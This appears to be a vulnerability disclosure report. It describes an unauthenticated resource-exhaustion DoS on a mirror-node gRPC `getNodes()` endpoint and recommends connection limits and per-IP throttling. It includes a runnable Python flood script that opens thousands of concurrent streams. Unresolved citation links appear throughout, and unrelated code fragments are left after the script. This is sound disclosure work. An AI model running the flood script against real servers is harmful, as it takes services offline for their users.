### Title
Unbounded TCP Connection Multiplexing on `getNodes()` Enables Unauthenticated Resource Exhaustion DoS

### Summary
The `getNodes()` endpoint in `NetworkController` requires no authentication and has no per-IP or per-client connection limit. The only server-side guard — `maxConcurrentCallsPerConnection = 5` — limits HTTP/2 streams per TCP connection but places no bound on the number of TCP connections a single client may open. An unprivileged attacker can open thousands of TCP connections (each carrying 5 concurrent streams) to drive thousands of simultaneous database-hitting calls, exhausting the HikariCP connection pool and the Reactor `boundedElastic` scheduler across mirror-node gRPC pods.

### Finding Description

**Code path:**

`NetworkController.getNodes()` (lines 33–43) accepts any `AddressBookQuery` with no credential check and immediately fans out to `NetworkServiceImpl.getNodes()`. [1](#0-0) 

`NetworkServiceImpl.getNodes()` issues at least three synchronous DB queries per call (timestamp lookups + full node-stake map load) before entering a paginated loop that issues additional queries per page: [2](#0-1) [3](#0-2) 

**The only server-side guard** is `maxConcurrentCallsPerConnection = 5`, applied in `GrpcConfiguration`: [4](#0-3) [5](#0-4) 

This property is a Netty `maxConcurrentCallsPerConnection` knob — it limits HTTP/2 streams *per TCP connection*, not the number of TCP connections a client may open. No `maxConnections`, `maxConnectionAge`, `permitKeepAliveWithoutCalls`, or per-IP limit is configured anywhere in the gRPC module. [6](#0-5) 

**No rate-limiting interceptor exists in the gRPC module.** The only `ServerInterceptor` present is a test-only `GrpcInterceptor` that merely sets an endpoint-context string: [7](#0-6) 

The `ThrottleManagerImpl` / `ThrottleConfiguration` rate-limiting infrastructure exists only in the `web3` module and is never wired into the gRPC service: [8](#0-7) 

**Root cause:** The failed assumption is that `maxConcurrentCallsPerConnection` constitutes a meaningful rate limit. It does not — it is a per-connection stream cap, and HTTP/2 multiplexing means an attacker can trivially open *N* TCP connections to achieve *N × 5* concurrent calls from a single IP.

### Impact Explanation
Each concurrent `getNodes()` call acquires a HikariCP database connection for the initial three queries and then holds a `boundedElastic` scheduler thread for the paginated streaming loop. With N=1,000 TCP connections (trivially achievable from a single host), an attacker drives 5,000 simultaneous DB-backed calls. This exhausts the HikariCP pool, causing all subsequent DB operations across the gRPC pod to queue or fail, and saturates the `boundedElastic` thread pool. Because the mirror-node gRPC service is typically deployed as a small replica set (2–4 pods per the Helm chart), a single attacker targeting all pods simultaneously can take down ≥30% of gRPC processing capacity without any brute-force credential guessing. [9](#0-8) 

### Likelihood Explanation
The endpoint is publicly documented and requires zero credentials: [10](#0-9) 

Any attacker with network access to port 5600 (or the nginx proxy on 8080) can execute this with a standard gRPC client library in under 20 lines of code. HTTP/2 connection establishment is cheap; opening 1,000 connections from a single machine is routine. No special knowledge, tokens, or prior access is required.

### Recommendation
Apply layered mitigations in `GrpcConfiguration`:

1. **Add `maxConnectionAge` and `maxConnectionIdle`** to `NettyServerBuilder` to force periodic connection recycling and prevent indefinite connection accumulation.
2. **Add a global `maxConnections` limit** (e.g., `serverBuilder.maxConnectionAge(...)`, `serverBuilder.maxConnectionIdle(...)`).
3. **Implement a per-IP rate-limiting `ServerInterceptor`** (e.g., using Bucket4j keyed on the remote peer address from `ServerCall.getAttributes(Grpc.TRANSPORT_ATTR_REMOTE_ADDR)`) and register it as a `@GlobalServerInterceptor` — mirroring the pattern already used in the `web3` module's `ThrottleManagerImpl`.
4. **Expose `maxConcurrentCallsPerConnection` as insufficient documentation** — rename or comment it to clarify it does not limit connection count.
5. At the infrastructure layer, enforce per-source-IP TCP connection limits at the load balancer / Kubernetes Gateway level.

### Proof of Concept

```python
import grpc
import threading
from hedera.mirror.api.proto import network_service_pb2_grpc
from hedera.mirror.api.proto.network_service_pb2 import AddressBookQuery
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-grpc-host:5600"
NUM_CONNECTIONS = 1000
STREAMS_PER_CONN = 5  # matches maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = network_service_pb2_grpc.NetworkServiceStub(channel)
    query = AddressBookQuery(
        file_id=basic_types_pb2.FileID(fileNum=102),
        limit=0  # request ALL nodes, maximizing DB work per call
    )
    threads = []
    for _ in range(STREAMS_PER_CONN):
        t = threading.Thread(target=lambda: list(stub.getNodes(query)))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

workers = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for w in workers: w.start()
for w in workers: w.join()
# Result: 5000 concurrent DB-backed getNodes() calls; HikariCP pool exhausted;
# gRPC pod becomes unresponsive to all clients.
```

        long addressBookTimestamp = addressBookRepository

    @Override
    public void throttle(ContractCallRequest request) {
        if (!rateLimitBucket.tryConsume(1)) {
            throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
        } else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
            throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
        }

        for (var requestFilter : throttleProperties.getRequest()) {
            if (requestFilter.test(request)) {
                action(requestFilter, request);
            }
        }
    }
